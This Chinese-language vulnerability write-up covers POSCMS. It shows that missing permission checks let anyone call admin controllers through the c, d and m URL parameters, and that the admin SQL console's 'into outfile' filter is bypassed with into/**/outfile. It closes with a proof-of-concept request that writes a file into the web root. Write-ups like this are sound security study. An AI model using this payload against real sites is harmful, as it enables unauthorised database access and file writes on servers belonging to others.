<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>POSCMS 任意sql语句执行漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><h2>三、复现过程</h2><h3>任意API调用</h3><p><strong>分析入口文件</strong></p><p>index.php ---&gt;/diy/init.php ------&gt;/diy/system/core/CodeIgniter.php</p><p>程序使用的CodeIgniter（CI）框架，直接去看CI框架。</p><p>$RTR =&amp; load_class('Router', 'core', isset($routing) ? $routing : NULL);</p><p>初始化Router类，调用_set_routing()方法绑定路由。</p><p>if ( ! isset($this-&gt;directory))<br />                    {<br />                            $_d = $this-&gt;config-&gt;item('directory_trigger');<br />                            $_d = isset($_GET[$_d]) ? trim($_GET[$_d], &quot; \t\n\r\0\x0B/&quot;) : '';<br /><br />                            if ($_d !== '')<br />                            {<br />                                    $this-&gt;uri-&gt;filter_uri($_d);<br />                                    $this-&gt;set_directory($_d);<br />                            }<br />                    }<br /><br />                    $_c = trim($this-&gt;config-&gt;item('controller_trigger'));<br />                    if ( ! empty($_GET[$_c]))<br />                    {<br />                            $this-&gt;uri-&gt;filter_uri($_GET[$_c]);<br />                            $this-&gt;set_class($_GET[$_c]);<br /><br />                            $_f = trim($this-&gt;config-&gt;item('function_trigger'));<br />                            if ( ! empty($_GET[$_f]))<br />                            {<br />                                    $this-&gt;uri-&gt;filter_uri($_GET[$_f]);<br />                                    $this-&gt;set_method($_GET[$_f]);<br />                            }<br /><br />                            $this-&gt;uri-&gt;rsegments = array(<br />                                    1 =&gt; $this-&gt;class,<br />                                    2 =&gt; $this-&gt;method<br />                            );<br />                    }<br />                    else<br />                    {<br />                            $this-&gt;_set_default_controller();<br />                    }</p><p>config</p><p>$config['controller_trigger']                        = 'c';<br />$config['function_trigger']                                = 'm';<br />$config['directory_trigger']                        = 'd';</p><p>简述这里就是</p><p>$this-&gt;class = $_GET[‘c’];<br />$this-&gt;method = $_GET[‘m’];<br />$this-&gt;directory = $_GET[‘d’];</p><p>回到CI框架，这里直接通过反射进行了调用。</p><p>$e404 = FALSE;<br />$class = ucfirst($RTR-&gt;class);<br />$method = $RTR-&gt;method;<br /><br />if (empty($class) OR ! file_exists(APPPATH.'controllers/'.$RTR-&gt;directory.$class.'.php'))<br />{<br />   $e404 = TRUE;<br />}<br />else<br />{<br />   require_once(APPPATH.'controllers/'.$RTR-&gt;directory.$class.'.php');<br /><br />   if ( ! class_exists($class, FALSE) OR $method[0] === '_' OR method_exists('CI_Controller', $method))<br />   {<br />     $e404 = TRUE;<br />   }<br />   elseif (method_exists($class, '_remap'))<br />   {<br />     $params = array($method, array_slice($URI-&gt;rsegments, 2));<br />     $method = '_remap';<br />   }<br />   elseif ( ! method_exists($class, $method))<br />   {<br />     $e404 = TRUE;<br />   }<br />   /**<br />    * DO NOT CHANGE THIS, NOTHING ELSE WORKS!<br />    *<br />    * - method_exists() returns true for non-public methods, which passes the previous elseif<br />    * - is_callable() returns false for PHP 4-style constructors, even if there's a __construct()<br />    * - method_exists($class, '__construct') won't work because CI_Controller::__construct() is inherited<br />    * - People will only complain if this doesn't work, even though it is documented that it shouldn't.<br />    *<br />    * ReflectionMethod::isConstructor() is the ONLY reliable check,<br />    * knowing which method will be executed as a constructor.<br />    */<br />   elseif ( ! is_callable(array($class, $method)) &amp;&amp; strcasecmp($class, $method) === 0)<br />   {<br />     $reflection = new ReflectionMethod($class, $method);<br />     if ( ! $reflection-&gt;isPublic() OR $reflection-&gt;isConstructor())<br />     {<br />      $e404 = TRUE;<br />     }<br />   }<br />}</p><p>APPPATH.’controllers/ = /diy/dayrui/controllers/</p><p>然后我们就可以调用这里的Controller，关键点是在这里有个admin文件夹，里面包含了管理员可调用的功能点，而且他继承的基类（SuperClass）并没有检测用户权限。就导致任意调用这里的功能点。</p><h3>SQL语句执行（增删改查）</h3><p>既然可以调用管理员才能调用的功能点，问题就太多了，这里就随便讲一个喽。</p><p>文件：/diy/dayrui/controllers/admin/Db.php 方法：sql</p><p> public function sql() {<br />    $sql = '';<br />    $count = $id = 0;<br /><br />    if (IS_POST) {<br />        $id = $this-&gt;input-&gt;post('id');<br />        $sql = str_replace('{dbprefix}', $this-&gt;db-&gt;dbprefix, $this-&gt;input-&gt;post('sql'));<br />        if (preg_match('/select(.*)into outfile(.*)/i', $sql)) {<br />            $this-&gt;admin_msg(fc_lang('存在非法select'));<br />        }<br />        $sql_data = explode(';SQL_FINECMS_EOL', trim(str_replace(array(PHP_EOL, chr(13), chr(10)), 'SQL_FINECMS_EOL', $sql)));<br />        if ($sql_data) {<br />            $db = $this-&gt;db;<br />            foreach($sql_data as $query){<br />                if (!$query) {<br />                    continue;<br />                }<br />                $queries = explode('SQL_FINECMS_EOL', trim($query));<br />                $ret = '';<br />                foreach($queries as $query) {<br />                    $ret.= $query[0] == '#' || $query[0].$query[1] == '--' ? '' : $query;<br />                }<br />                if (!$ret) {<br />                    continue;<br />                }<br />                $db-&gt;query($ret);<br />                $count++;<br />            }<br />            if ($count == 1 &amp;&amp; stripos($ret, 'select') === 0) {<br />                $this-&gt;template-&gt;assign(array(<br />                    'result' =&gt; $db-&gt;query($ret)-&gt;result_array(),<br />                ));<br />            }<br />        }<br />    }<br /><br />    $this-&gt;template-&gt;assign(array(<br />        'menu' =&gt; $this-&gt;get_menu_v3(array(<br />            fc_lang('执行SQL') =&gt; array('admin/db/sql', 'database')<br />        )),<br />        'id' =&gt; $id,<br />        'sql' =&gt; $sql,<br />        'mcount' =&gt; $count,<br />    ));<br />    $this-&gt;template-&gt;display('db_sql.html');<br />}</p><p>这里使用正则表达式匹配危险字符into outfile，绕过就太简单了。into/**/outfile。</p><h3>poc</h3><p>https://www.0-sec.org/index.php?c=db&amp;amp;d=admin&amp;amp;m=sql Post sql=select 1 into/**/outfile 'C:\phpstudy_pro\WWW\www.0-sec.org\poscms\11111.txt'</p></body></html>